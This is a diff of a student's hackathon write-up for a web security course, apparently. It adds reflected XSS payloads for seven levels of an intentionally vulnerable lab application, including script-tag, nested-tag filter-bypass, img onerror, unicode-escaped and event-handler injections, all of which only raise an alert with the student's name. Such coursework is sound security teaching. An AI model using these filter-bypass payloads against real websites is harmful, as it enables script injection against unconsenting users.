@@ -26,6 +26,8 @@ This hackathon focuses on hands-on activities to help participants learn cross-s
 
 ### Task 1: Attacks (35 pts) 
 
+In the task 1 I used `alert()` to display my name when seven layers of reflected XSS attacks are performed on a given web application. Furthermore, for levels 2–6, I examine the [http://waph-hackathon.eastus.cloudapp.azure.com/xss/](http://waph-hackathon.eastus.cloudapp.azure.com/xss/) `echo.php` source code to find attack sites. This exercise gave me hands-on experience finding and exploiting XSS vulnerabilities, while also reinforcing online security fundamentals.
+
 There are seven levels of reflected cross-site scripting attacks on
 [http://waph-hackathon.eastus.cloudapp.azure.com/xss/](http://waph-hackathon.eastus.cloudapp.azure.com/xss/)
 
@@ -40,15 +42,25 @@ web application, i.e., where the vulnerability is exploited (2 pts each)_
 
 +  Level 0:
 
+```
+<script>alert("Level 0-hacked by Amit Gaddi")</script>"
+
+```
+
 
 ![Screenshot](images/Screenshot0.png)   
 
 +  Level 1:
 
+```
+http://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?input=%3Cscript%3Ealert(%22Level%201-hacked%20by%20Amit%20Gaddi%22)%3C/script%3E%22
 
+```
 ![Screenshot](images/Screenshot1.png)   
 
 +  Level 2:
+
+
 
 Included file `Level2.html`
 ```html
@@ -73,21 +85,41 @@ Included file `Level2.html`
 
 +  Level 3:
 
+```
+http://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php?input=%3Csc%3Cscript%3Eript%3Ealert(%27level-3%20hacked%20by%20Amit%20Gaddi%27)%3C/sc%3C/script%3Eript%3E
+
+```
+
 
 ![Screenshot](images/Screenshot3.png)   
 
 +  Level 4:
+
+```
+http://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php?input=%3Cimg%20src=%22..%22%20onerror=%22alert(%27Level%204%20:%20Hacked%20by%20Amit%20Gaddi%27)%22%3E
+
+```
 
 
 ![Screenshot](images/Screenshot4.png)   
 
 +  Level 5:
 
+```
+http://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=%3Cimg%20src=%22..%22%20onerror=%22%5Cu0061lert(%27Level%205:%20Hacked%20By%20Amit%20Gaddi%27)%22%3E
+
+```
+
 
 ![Screenshot](images/Screenshot5.png)   
 
 
 +  Level 6:
+
+```
+http://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php/%22%20onmouseover=%22alert('level%206:%20Hacked%20by%20Amit%20Gaddi%20%20')%22
+
+```
 
 
 ![Screenshot](images/Screenshot6.png)   
@@ -97,11 +129,13 @@ Included file `Level2.html`
 
 ### Task 2. Defenses: (15 pts) 
 
-Review and  revise your vulnerable,
-insecure code in Lab 1 and Lab 2 by implementing input validation and XSS defense methods in: 
-  + echo.php (from Lab 1) (3 pts)
+
+
++ echo.php (from Lab 1) (3 pts)
+
+
   
-  + Current front-end prototype (Lab 2) (12 pts): identify external input data channels, where you must validate the data before using it, and encode the data before displaying/injecting in the front-end interface, i.e., webpage
++ Current front-end prototype (Lab 2) (12 pts): identify external input data channels, where you must validate the data before using it, and encode the data before displaying/injecting in the front-end interface, i.e., webpage
 
 For each revision, commit and push the code to GitHub with an appropriate message, and capture a screenshot on GitHub of that commit to illustrate the code revision (GitHub -> Code -> xx commits ->
 click on the commit you revised the code). The expected screenshot is illustrated in Lecture 8 and the attached slides.
